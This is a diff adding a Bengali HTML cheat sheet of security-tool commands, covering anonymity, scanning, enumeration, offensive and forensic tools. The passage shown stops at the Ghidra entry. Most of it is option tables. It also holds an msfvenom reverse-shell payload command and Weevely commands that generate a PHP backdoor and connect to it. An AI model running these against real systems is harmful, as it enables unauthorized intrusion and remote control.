@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<title>টুল কমান্ড লিস্ট</title>
+<style>
+  /* ===== কালারফুল স্টাইল ===== */
+  @page { size: A4; margin: 2cm; }
+  body {
+    font-family: 'Noto Sans Bengali', 'SolaimanLipi', sans-serif;
+    font-size: 11pt;
+    line-height: 1.6;
+    color: #1a1a1a;
+  }
+  h1 {
+    color: #1a5276;
+    border-bottom: 3px solid #1a5276;
+    padding-bottom: 6px;
+    text-align: center;
+  }
+  h2 {
+    color: #2e86c1;
+    border-left: 6px solid #2e86c1;
+    padding-left: 10px;
+    margin-top: 30px;
+    page-break-after: avoid;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 10px 0 20px 0;
+    page-break-inside: avoid;
+  }
+  th, td {
+    border: 1px solid #555;
+    padding: 6px 8px;
+    text-align: left;
+    vertical-align: top;
+  }
+  th {
+    background-color: #d6eaf8;
+    color: #000;
+  }
+  code {
+    background-color: #f4f4f4;
+    padding: 2px 5px;
+    border-radius: 3px;
+    font-family: 'Courier New', monospace;
+    font-size: 10pt;
+  }
+  .example {
+    background-color: #eafaf1;
+    border-left: 4px solid #27ae60;
+    padding: 8px 12px;
+    margin: 10px 0;
+  }
+  /* ===== নন-কালারফুল করতে নিচের কমেন্ট খুলে দিন ===== */
+  /*
+  body, h1, h2, th, td, code, .example { color: #000 !important; background: #fff !important; border-color: #000 !important; }
+  h1 { border-bottom: 3px solid #000 !important; }
+  h2 { border-left: 6px solid #000 !important; }
+  th { background-color: #eee !important; }
+  .example { background-color: #f9f9f9 !important; border-left: 4px solid #000 !important; }
+  */
+</style>
+</head>
+<body>
+
+<h1>টুল কমান্ড লিস্ট (৪৮টি টুল)</h1>
+<p style="text-align:center;">বিস্তারিত কমান্ড, অপশন ও উদাহরণ সহ</p>
+
+<!-- ==================== ১. Proxychains4 ==================== -->
+<h2>১. Proxychains4 (ProxyChains-ng)</h2>
+<p><strong>বেসিক সিনট্যাক্স:</strong> <code>proxychains4 [options] &lt;program&gt; [arguments]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-q</td><td>কোয়ায়েট মোড (প্রক্সি তথ্য দেখাবে না)</td></tr>
+<tr><td>-f &lt;config_file&gt;</td><td>নির্দিষ্ট কনফিগারেশন ফাইল ব্যবহার</td></tr>
+<tr><td>-h, --help</td><td>হেল্প দেখায়</td></tr>
+<tr><td>-l &lt;level&gt;</td><td>লগ লেভেল সেট করে (v/d/i/w/e/c)</td></tr>
+<tr><td>-Q</td><td>কোয়ায়েট মোড বন্ধ করে</td></tr>
+</table>
+<p><strong>ডেমন মোড:</strong> <code>proxychains4-daemon -i &lt;listenip&gt; -p &lt;port&gt; -r &lt;remotesubnet&gt;</code></p>
+<div class="example"><strong>উদাহরণ:</strong> <code>proxychains4 -q -f proxychains.conf nmap -sT -Pn 192.168.1.1</code></div>
+
+<!-- ==================== ২. TorGate ==================== -->
+<h2>২. TorGate</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>sudo torgate start</td><td>শুরু করে</td></tr>
+<tr><td>sudo torgate stop</td><td>বন্ধ করে</td></tr>
+<tr><td>sudo torgate start -o</td><td>obfs4 ব্রিজ ব্যবহার</td></tr>
+<tr><td>sudo torgate start -s</td><td>নির্দিষ্ট ব্রিজ</td></tr>
+<tr><td>sudo torgate start -v</td><td>ভারবোস মোড</td></tr>
+</table>
+<p><strong>অপশন:</strong> <code>-o</code> (obfs4), <code>-s</code> (নির্দিষ্ট ব্রিজ), <code>-v</code> (ভারবোস)</p>
+
+<!-- ==================== ৩. Telegram-CLI ==================== -->
+<h2>৩. Telegram-CLI</h2>
+<table>
+<tr><th>কমান্ড/অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>telegram-cli -k &lt;public-server-key&gt;</td><td>সার্ভার কী সহ শুরু</td></tr>
+<tr><td>telegram-cli -f json me</td><td>JSON ফরম্যাটে নিজের তথ্য</td></tr>
+<tr><td>telegram-cli --config &lt;path&gt;</td><td>কনফিগ ফাইল</td></tr>
+<tr><td>telegram-cli --session &lt;name&gt;</td><td>সেশন ম্যানেজমেন্ট</td></tr>
+<tr><td>msg &lt;peer&gt; &lt;text&gt;</td><td>মেসেজ পাঠায়</td></tr>
+<tr><td>fwd &lt;user&gt; &lt;msg-seqno&gt;</td><td>মেসেজ ফরওয়ার্ড</td></tr>
+<tr><td>dialog_list</td><td>ডায়ালগ লিস্ট</td></tr>
+<tr><td>history [n]</td><td>শেষ n মেসেজ</td></tr>
+</table>
+
+<!-- ==================== ৪. Tor ==================== -->
+<h2>৪. Tor (Tor Proxy)</h2>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-h, --help</td><td>হেল্প</td></tr>
+<tr><td>-f, --torrc-file &lt;file&gt;</td><td>কনফিগারেশন ফাইল</td></tr>
+<tr><td>--verify-config</td><td>কনফিগ ভেরিফাই</td></tr>
+<tr><td>--hash-password &lt;password&gt;</td><td>পাসওয়ার্ড হ্যাশ</td></tr>
+<tr><td>--list-fingerprint</td><td>ফিঙ্গারপ্রিন্ট লিস্ট</td></tr>
+<tr><td>--quiet, --hush</td><td>কম আউটপুট</td></tr>
+<tr><td>--service install</td><td>সার্ভিস ইনস্টল</td></tr>
+<tr><td>--dump-config short|full</td><td>কনফিগ ডাম্প</td></tr>
+</table>
+<p><strong>Torsocks:</strong> <code>torsocks &lt;command&gt;</code> – Tor এর মাধ্যমে কমান্ড চালায়</p>
+
+<!-- ==================== ৫. AnonSurf ==================== -->
+<h2>৫. AnonSurf</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>sudo anonsurf start</td><td>অ্যানোনিমাইজেশন শুরু</td></tr>
+<tr><td>sudo anonsurf stop</td><td>বন্ধ</td></tr>
+<tr><td>sudo anonsurf restart</td><td>রিস্টার্ট</td></tr>
+<tr><td>sudo anonsurf change</td><td>Tor আইডেন্টিটি পরিবর্তন</td></tr>
+<tr><td>sudo anonsurf status</td><td>স্ট্যাটাস</td></tr>
+<tr><td>sudo anonsurf ip</td><td>IP দেখায়</td></tr>
+<tr><td>sudo anonsurf-cli start|stop|changeid|check</td><td>CLI ভার্সন</td></tr>
+</table>
+
+<!-- ==================== ৬. Nmap ==================== -->
+<h2>৬. Nmap</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>nmap [Scan Type(s)] [Options] {target}</code></p>
+<table>
+<tr><th>ক্যাটাগরি</th><th>অপশন</th></tr>
+<tr><td>টার্গেট</td><td>-iL &lt;file&gt;, -iR &lt;num&gt;, --exclude, --excludefile</td></tr>
+<tr><td>হোস্ট ডিসকভারি</td><td>-sn, -Pn, -PR</td></tr>
+<tr><td>স্ক্যান টেকনিক</td><td>-sS, -sT, -sU, -sV, -O</td></tr>
+<tr><td>পোর্ট</td><td>-p, -F, --top-ports</td></tr>
+<tr><td>আউটপুট</td><td>-oN, -oX, -oS, -oG</td></tr>
+<tr><td>বিবিধ</td><td>-v, -A, --packet-trace, --iflist</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>nmap -v -A scanme.nmap.org</code></div>
+
+<!-- ==================== ৭. WHOIS ==================== -->
+<h2>৭. WHOIS</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>whois [options] &lt;object&gt;</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-h, --host &lt;host&gt;</td><td>WHOIS সার্ভার</td></tr>
+<tr><td>-p, --port &lt;port&gt;</td><td>পোর্ট</td></tr>
+<tr><td>-a</td><td>সব ডাটাবেস সার্চ</td></tr>
+<tr><td>-F</td><td>ফাস্ট ও RAW আউটপুট</td></tr>
+<tr><td>-g &lt;source:first-last&gt;</td><td>রেঞ্জ সার্চ</td></tr>
+<tr><td>-i &lt;attr&gt;</td><td>অ্যাট্রিবিউট সার্চ</td></tr>
+<tr><td>-T &lt;type&gt;</td><td>নির্দিষ্ট টাইপ</td></tr>
+<tr><td>--verbose</td><td>বিস্তারিত</td></tr>
+<tr><td>--no-recursion</td><td>রিকার্সন বন্ধ</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>whois -h whois.arin.net "example.com"</code></div>
+
+<!-- ==================== ৮. Nikto ==================== -->
+<h2>৮. Nikto</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>nikto -h &lt;host&gt; [options]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-h, -host</td><td>টার্গেট হোস্ট</td></tr>
+<tr><td>-p, -port</td><td>পোর্ট</td></tr>
+<tr><td>-ssl</td><td>SSL ফোর্স</td></tr>
+<tr><td>-o &lt;file&gt;</td><td>আউটপুট ফাইল</td></tr>
+<tr><td>-Format &lt;type&gt;</td><td>ফরম্যাট (html, csv, xml, json)</td></tr>
+<tr><td>-Tuning &lt;types&gt;</td><td>স্ক্যান টিউনিং</td></tr>
+<tr><td>-evasion &lt;technique&gt;</td><td>ইভেশন টেকনিক</td></tr>
+<tr><td>-Cgidirs &lt;dirs&gt;</td><td>CGI ডিরেক্টরি</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>nikto -h http://example.com -p 8080 -o output.html -Format html</code></div>
+
+<!-- ==================== ৯. DNSenum ==================== -->
+<h2>৯. DNSenum</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>dnsenum [options] &lt;domain&gt;</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>--dnsserver &lt;server&gt;</td><td>নির্দিষ্ট DNS সার্ভার</td></tr>
+<tr><td>--enum</td><td>দ্রুত এনুমারেশন</td></tr>
+<tr><td>-f &lt;file&gt;</td><td>ওয়ার্ডলিস্ট</td></tr>
+<tr><td>--threads &lt;n&gt;</td><td>থ্রেড সংখ্যা</td></tr>
+<tr><td>-o &lt;file&gt;</td><td>আউটপুট (XML)</td></tr>
+<tr><td>--noreverse</td><td>রিভার্স লুকআপ বাদ</td></tr>
+<tr><td>--private</td><td>প্রাইভেট IP অন্তর্ভুক্ত</td></tr>
+<tr><td>--help</td><td>হেল্প</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>dnsenum --threads 10 --enum -f subdomains.txt example.com -o output.xml</code></div>
+
+<!-- ==================== ১০. Maltego ==================== -->
+<h2>১০. Maltego</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>maltego</td><td>GUI শুরু</td></tr>
+<tr><td>maltego ce</td><td>কমিউনিটি এডিশন</td></tr>
+<tr><td>maltego -i config.mtgx</td><td>হেডলেস মোড</td></tr>
+<tr><td>maltego --reset</td><td>কনফিগ রিসেট</td></tr>
+<tr><td>maltego --run-transform email_to_person</td><td>ট্রান্সফর্ম রান</td></tr>
+<tr><td>maltego --graph new</td><td>নতুন গ্রাফ</td></tr>
+<tr><td>maltegocli -entity domain:example.com -transform all</td><td>CLI অটোমেশন</td></tr>
+</table>
+
+<!-- ==================== ১১. Dirb ==================== -->
+<h2>১১. Dirb</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>dirb &lt;url_base&gt; [&lt;wordlist&gt;] [options]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-a &lt;agent&gt;</td><td>ইউজার-এজেন্ট</td></tr>
+<tr><td>-c &lt;cookie&gt;</td><td>কুকি</td></tr>
+<tr><td>-p &lt;proxy&gt;</td><td>প্রক্সি</td></tr>
+<tr><td>-o &lt;file&gt;</td><td>আউটপুট</td></tr>
+<tr><td>-r</td><td>রিকার্সন বন্ধ</td></tr>
+<tr><td>-R</td><td>ইন্টারঅ্যাকটিভ রিকার্সন</td></tr>
+<tr><td>-S</td><td>সাইলেন্ট মোড</td></tr>
+<tr><td>-z &lt;ms&gt;</td><td>ডিলে</td></tr>
+<tr><td>-X &lt;ext&gt;</td><td>এক্সটেনশন অ্যাপেন্ড</td></tr>
+<tr><td>-H &lt;header&gt;</td><td>হেডার</td></tr>
+<tr><td>-i</td><td>কেস-ইনসেনসিটিভ</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>dirb http://example.com /path/to/wordlist.txt -a "Mozilla/5.0" -o output.txt</code></div>
+
+<!-- ==================== ১২. Gobuster ==================== -->
+<h2>১২. Gobuster</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>gobuster [mode] -u &lt;URL&gt; -w &lt;wordlist&gt; [options]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-t</td><td>থ্রেড</td></tr>
+<tr><td>-o</td><td>আউটপুট ফাইল</td></tr>
+<tr><td>-q</td><td>কোয়ায়েট</td></tr>
+<tr><td>-k</td><td>TLS ভেরিফিকেশন স্কিপ</td></tr>
+<tr><td>-a</td><td>ইউজার-এজেন্ট</td></tr>
+<tr><td>-x</td><td>এক্সটেনশন</td></tr>
+<tr><td>-r</td><td>রিডাইরেক্ট বন্ধ</td></tr>
+<tr><td>-fw</td><td>ওয়াইল্ডকার্ড ফোর্স</td></tr>
+<tr><td>-np</td><td>প্রগ্রেস হাইড</td></tr>
+<tr><td>--timeout</td><td>টাইমআউট</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>gobuster dir -u http://example.com -w wordlist.txt -x php,html -t 50</code></div>
+
+<!-- ==================== ১৩. Metasploit ==================== -->
+<h2>১৩. Metasploit (MSFconsole)</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>msfconsole -q</td><td>ব্যানার ছাড়া শুরু</td></tr>
+<tr><td>msfconsole -r &lt;file&gt;</td><td>রিসোর্স স্ক্রিপ্ট</td></tr>
+<tr><td>msfconsole -x &lt;cmd&gt;</td><td>কমান্ড এক্সিকিউট</td></tr>
+<tr><td>use &lt;module&gt;</td><td>মডিউল সিলেক্ট</td></tr>
+<tr><td>show options</td><td>অপশন দেখায়</td></tr>
+<tr><td>set &lt;opt&gt; &lt;val&gt;</td><td>অপশন সেট</td></tr>
+<tr><td>exploit -j</td><td>জব হিসেবে চালায়</td></tr>
+<tr><td>exploit -z</td><td>সেশন ইন্টারঅ্যাক্ট না করে</td></tr>
+<tr><td>sessions -i &lt;id&gt;</td><td>সেশনে প্রবেশ</td></tr>
+<tr><td>sessions -l</td><td>সেশন লিস্ট</td></tr>
+<tr><td>sessions -k &lt;id&gt;</td><td>সেশন কিল</td></tr>
+</table>
+
+<!-- ==================== ১৪. MSFvenom ==================== -->
+<h2>১৪. MSFvenom</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>msfvenom [options] &lt;var=val&gt;</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-p, --payload &lt;payload&gt;</td><td>পেলোড</td></tr>
+<tr><td>-f, --format &lt;format&gt;</td><td>ফরম্যাট (exe, elf)</td></tr>
+<tr><td>-e, --encoder &lt;encoder&gt;</td><td>এনকোডার</td></tr>
+<tr><td>-i, --iterations &lt;count&gt;</td><td>এনকোডিং পুনরাবৃত্তি</td></tr>
+<tr><td>-l, --list &lt;type&gt;</td><td>লিস্ট (payloads, encoders)</td></tr>
+<tr><td>--list-options</td><td>পেলোড অপশন লিস্ট</td></tr>
+<tr><td>-b, --bad-chars</td><td>ব্যাড ক্যারেক্টার</td></tr>
+<tr><td>-a, --arch</td><td>আর্কিটেকচার</td></tr>
+<tr><td>--platform</td><td>প্ল্যাটফর্ম</td></tr>
+<tr><td>-o, --out &lt;file&gt;</td><td>আউটপুট ফাইল</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o shell.exe</code></div>
+
+<!-- ==================== ১৫. ExifTool ==================== -->
+<h2>১৫. ExifTool</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>exiftool [OPTIONS] [-TAG...] [--TAG...] FILE...</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-TAG=[VALUE]</td><td>ট্যাগ রাইট/ডিলিট</td></tr>
+<tr><td>-geotag</td><td>জিওট্যাগ</td></tr>
+<tr><td>-csv=&lt;file&gt;</td><td>CSV ইনপুট</td></tr>
+<tr><td>-json=&lt;file&gt;</td><td>JSON ইনপুট</td></tr>
+<tr><td>-tagsFromFile</td><td>মেটাডেটা কপি</td></tr>
+<tr><td>-r</td><td>রিকার্সিভ</td></tr>
+<tr><td>-ext &lt;ext&gt;</td><td>ফাইল এক্সটেনশন ফিল্টার</td></tr>
+<tr><td>-q</td><td>কোয়ায়েট</td></tr>
+<tr><td>-g</td><td>গ্রুপ</td></tr>
+<tr><td>-j</td><td>JSON আউটপুট</td></tr>
+<tr><td>-o &lt;file&gt;</td><td>আউটপুট ফাইল</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>exiftool -g -json -P image.jpg</code></div>
+
+<!-- ==================== ১৬. Autopsy ==================== -->
+<h2>১৬. Autopsy</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>autopsy [options] [addr]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-c</td><td>কুকি ফোর্স</td></tr>
+<tr><td>-C</td><td>কুকি না</td></tr>
+<tr><td>-d &lt;evid_locker&gt;</td><td>এভিডেন্স লকার ডিরেক্টরি</td></tr>
+<tr><td>-i &lt;device&gt; &lt;filesystem&gt; &lt;mnt&gt;</td><td>লাইভ অ্যানালাইসিস</td></tr>
+<tr><td>-p &lt;port&gt;</td><td>পোর্ট</td></tr>
+</table>
+<p><strong>CLI র্যাপার:</strong> <code>autopsycli case --create MyCase --base /cases</code></p>
+
+<!-- ==================== ১৭. APKTool ==================== -->
+<h2>১৭. APKTool</h2>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-q, --quiet</td><td>কোয়ায়েট</td></tr>
+<tr><td>-v, --verbose</td><td>ভারবোস</td></tr>
+<tr><td>-f, --force</td><td>ফোর্স</td></tr>
+<tr><td>-j, --jobs &lt;num&gt;</td><td>জব সংখ্যা</td></tr>
+<tr><td>-api, --api-level &lt;API&gt;</td><td>API লেভেল</td></tr>
+<tr><td>-b, --no-debug-info</td><td>ডিবাগ ইনফো বাদ</td></tr>
+<tr><td>-k, --keep-broken-res</td><td>ব্রোকেন রিসোর্স রাখে</td></tr>
+<tr><td>-m, --match-original</td><td>অরিজিনাল ম্যাচ</td></tr>
+<tr><td>--only-main-classes</td><td>শুধু মেইন ক্লাস</td></tr>
+<tr><td>-c, --copy-original</td><td>অরিজিনাল কপি</td></tr>
+<tr><td>-d, --debug</td><td>ডিবাগ</td></tr>
+<tr><td>-na, --no-apk</td><td>APK তৈরি না</td></tr>
+<tr><td>-nc, --no-crunch</td><td>ক্রাঞ্চ না</td></tr>
+<tr><td>--use-aapt1</td><td>AAPT1 ব্যবহার</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>apktool d target.apk -o output_dir -f</code></div>
+
+<!-- ==================== ১৮. Hping3 ==================== -->
+<h2>১৮. Hping3</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>hping3 [options] &lt;hostname&gt;</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-h, --help</td><td>হেল্প</td></tr>
+<tr><td>-v, --version</td><td>ভার্সন</td></tr>
+<tr><td>-c &lt;count&gt;</td><td>প্যাকেট সংখ্যা</td></tr>
+<tr><td>-i &lt;wait&gt;</td><td>ইন্টারভাল</td></tr>
+<tr><td>--fast</td><td>দ্রুত মোড</td></tr>
+<tr><td>-I &lt;interface&gt;</td><td>ইন্টারফেস</td></tr>
+<tr><td>-a &lt;host&gt;</td><td>সোর্স অ্যাড্রেস</td></tr>
+<tr><td>-t &lt;ttl&gt;</td><td>TTL</td></tr>
+<tr><td>-s &lt;port&gt;</td><td>সোর্স পোর্ট</td></tr>
+<tr><td>-d &lt;size&gt;</td><td>ডাটা সাইজ</td></tr>
+<tr><td>-w &lt;win&gt;</td><td>উইন্ডো সাইজ</td></tr>
+<tr><td>-C &lt;type&gt;</td><td>ICMP টাইপ</td></tr>
+<tr><td>-K &lt;code&gt;</td><td>ICMP কোড</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>hping3 -S -p 80 -c 5 192.168.1.1</code></div>
+
+<!-- ==================== ১৯. Whonix Gateway ==================== -->
+<h2>১৯. Whonix Gateway</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>sudo virsh start Whonix-Gateway</td><td>VM শুরু</td></tr>
+<tr><td>sudo virsh start Whonix-Workstation</td><td>ওয়ার্কস্টেশন শুরু</td></tr>
+<tr><td>systemcheck</td><td>সিস্টেম চেক</td></tr>
+<tr><td>connection wizard</td><td>Tor এনাবল/ডিসেবল</td></tr>
+</table>
+<p><strong>নেটওয়ার্ক কনফিগ:</strong> <code>sudo nano /etc/network/interfaces.d/30_non-qubes-whonix</code></p>
+
+<!-- ==================== ২০. OutGuess ==================== -->
+<h2>২০. OutGuess</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>outguess [options] [input] [output]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-h</td><td>হেল্প</td></tr>
+<tr><td>-d &lt;file&gt;</td><td>ডাটা ফাইল এম্বেড</td></tr>
+<tr><td>-r</td><td>রিট্রিভ মোড</td></tr>
+<tr><td>-k &lt;key&gt;</td><td>পাসওয়ার্ড/কী</td></tr>
+<tr><td>-c</td><td>ক্যাপাসিটি চেক</td></tr>
+<tr><td>-F</td><td>ফোর্স এম্বেড</td></tr>
+<tr><td>-e</td><td>এরর কারেকশন</td></tr>
+<tr><td>-s &lt;n&gt;</td><td>ইটারেশন স্টার্ট</td></tr>
+<tr><td>-i &lt;n&gt;</td><td>ইটারেশন লিমিট</td></tr>
+<tr><td>-x &lt;maxkeys&gt;</td><td>সর্বোচ্চ কী</td></tr>
+<tr><td>-p &lt;param&gt;</td><td>প্যারামিটার</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>outguess -k "secret" -d hidden.txt cover.jpg output.jpg</code></div>
+
+<!-- ==================== ২১. Interceptty ==================== -->
+<h2>২১. Interceptty</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>interceptty [options] &lt;device&gt; [output]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-V</td><td>ভার্সন</td></tr>
+<tr><td>-q</td><td>কোয়ায়েট</td></tr>
+<tr><td>-v</td><td>ভারবোস</td></tr>
+<tr><td>-l</td><td>লাইন-বাফার</td></tr>
+<tr><td>-s &lt;back-set&gt;</td><td>ব্যাকএন্ড সেটিং</td></tr>
+<tr><td>-o &lt;output-file&gt;</td><td>আউটপুট ফাইল</td></tr>
+<tr><td>-p &lt;pty-dev&gt;</td><td>PTY ডিভাইস</td></tr>
+<tr><td>-t &lt;tty-dev&gt;</td><td>TTY ডিভাইস</td></tr>
+<tr><td>-m &lt;pty-owner&gt;</td><td>মালিক</td></tr>
+<tr><td>-g &lt;gid&gt;</td><td>গ্রুপ আইডি</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>interceptty -s 'ispeed 9600 ospeed 9600' /dev/ttyS0 /dev/ttyS1</code></div>
+
+<!-- ==================== ২২. Weevely Backdoor ==================== -->
+<h2>২২. Weevely Backdoor</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>weevely generate &lt;password&gt; &lt;path&gt;</td><td>এজেন্ট জেনারেট</td></tr>
+<tr><td>weevely &lt;URL&gt; &lt;password&gt;</td><td>সেশনে কানেক্ট</td></tr>
+<tr><td>weevely &lt;URL&gt; &lt;password&gt; &lt;cmd&gt;</td><td>কমান্ড এক্সিকিউট</td></tr>
+<tr><td>terminal, session, generate</td><td>সাব-কমান্ড</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>weevely generate secret123 backdoor.php</code><br><code>weevely http://target.com/backdoor.php secret123</code></div>
+
+<!-- ==================== ২৩. Tor Browser ==================== -->
+<h2>২৩. Tor Browser</h2>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>--verbose</td><td>Tor ও Firefox আউটপুট টার্মিনালে</td></tr>
+<tr><td>--log [file]</td><td>লগ ফাইল</td></tr>
+<tr><td>--detach</td><td>ব্যাকগ্রাউন্ডে চালায়</td></tr>
+<tr><td>--new-instance</td><td>নতুন ইনস্ট্যান্স</td></tr>
+<tr><td>--offline</td><td>অফলাইন মোড</td></tr>
+<tr><td>--private-window</td><td>প্রাইভেট উইন্ডো</td></tr>
+<tr><td>--safe-mode</td><td>সেফ মোড</td></tr>
+<tr><td>--new-window &lt;url&gt;</td><td>নতুন উইন্ডো</td></tr>
+<tr><td>--allow-remote</td><td>রিমোট কমান্ড অনুমোদন</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>./start-tor-browser.desktop --verbose</code></div>
+
+<!-- ==================== ২৪. Wireshark / TShark ==================== -->
+<h2>২৪. Wireshark / TShark</h2>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-i &lt;interface&gt;</td><td>ইন্টারফেস</td></tr>
+<tr><td>-f &lt;capture filter&gt;</td><td>ক্যাপচার ফিল্টার</td></tr>
+<tr><td>-Y &lt;display filter&gt;</td><td>ডিসপ্লে ফিল্টার</td></tr>
+<tr><td>-w &lt;file&gt;</td><td>ক্যাপচার ফাইল লেখা</td></tr>
+<tr><td>-r &lt;file&gt;</td><td>ফাইল পড়া</td></tr>
+<tr><td>-c &lt;count&gt;</td><td>প্যাকেট সংখ্যা</td></tr>
+<tr><td>-a &lt;condition&gt;</td><td>অটোস্টপ</td></tr>
+<tr><td>-b &lt;option&gt;</td><td>রিং বাফার</td></tr>
+<tr><td>-D</td><td>ইন্টারফেস লিস্ট</td></tr>
+<tr><td>-k</td><td>সাথে সাথে ক্যাপচার শুরু</td></tr>
+<tr><td>-d &lt;layer&gt;==&lt;selector&gt;</td><td>ডিকোড অ্যাজ</td></tr>
+<tr><td>-z &lt;statistics&gt;</td><td>স্ট্যাটিস্টিকস</td></tr>
+<tr><td>-V</td><td>ভারবোস</td></tr>
+<tr><td>-x</td><td>হেক্স ডাম্প</td></tr>
+<tr><td>-O &lt;protocol&gt;</td><td>প্রোটোকল সিলেকশন</td></tr>
+<tr><td>-T &lt;format&gt;</td><td>আউটপুট ফরম্যাট</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>tshark -i eth0 -f "tcp port 80" -w capture.pcap</code></div>
+
+<!-- ==================== ২৫. Zeek ==================== -->
+<h2>২৫. Zeek</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>zeek [options] [file]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-r &lt;file&gt;</td><td>PCAP পড়া</td></tr>
+<tr><td>-i &lt;interface&gt;</td><td>ইন্টারফেস ক্যাপচার</td></tr>
+<tr><td>-C</td><td>চেকসাম ইগনোর</td></tr>
+<tr><td>-e &lt;code&gt;</td><td>Zeek কোড এক্সিকিউট</td></tr>
+<tr><td>-f &lt;filter&gt;</td><td>BPF ফিল্টার</td></tr>
+<tr><td>-w &lt;file&gt;</td><td>RAW প্যাকেট লেখা</td></tr>
+<tr><td>-b</td><td>ব্যার মোড</td></tr>
+<tr><td>-N</td><td>প্লাগইন লিস্ট</td></tr>
+<tr><td>-a</td><td>পার্স-ওনলি</td></tr>
+<tr><td>-d</td><td>ডিবাগ পলিসি</td></tr>
+<tr><td>-h</td><td>হেল্প</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>zeek -C -r capture.pcap script.zeek</code></div>
+
+<!-- ==================== ২৬. YARA ==================== -->
+<h2>২৬. YARA</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>yara [OPTIONS] RULES_FILE TARGET</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-C, --compiled-rules</td><td>কম্পাইলড রুলস</td></tr>
+<tr><td>-c, --count</td><td>শুধু ম্যাচ সংখ্যা</td></tr>
+<tr><td>-d &lt;id&gt;=&lt;value&gt;</td><td>এক্সটার্নাল ভেরিয়েবল</td></tr>
+<tr><td>-f, --fast-scan</td><td>ফাস্ট স্ক্যান</td></tr>
+<tr><td>-r, --recursive</td><td>রিকার্সিভ</td></tr>
+<tr><td>-s</td><td>ম্যাচিং স্ট্রিং দেখায়</td></tr>
+<tr><td>-m</td><td>মেটাডেটা দেখায়</td></tr>
+<tr><td>-a &lt;timeout&gt;</td><td>টাইমআউট</td></tr>
+<tr><td>-n, --negate</td><td>নন-ম্যাচ দেখায়</td></tr>
+<tr><td>-g</td><td>ট্যাগ দেখায়</td></tr>
+<tr><td>-t &lt;tag&gt;</td><td>ট্যাগ ফিল্টার</td></tr>
+<tr><td>-i &lt;id&gt;</td><td>আইডেন্টিফায়ার ফিল্টার</td></tr>
+<tr><td>-D</td><td>মডিউল ডাটা প্রিন্ট</td></tr>
+<tr><td>-q</td><td>কনসোল লগ বন্ধ</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>yara -r rules.yar /path/to/scan</code></div>
+
+<!-- ==================== ২৭. Ghidra ==================== -->
+<h2>২৭. Ghidra (Headless Analyzer)</h2>
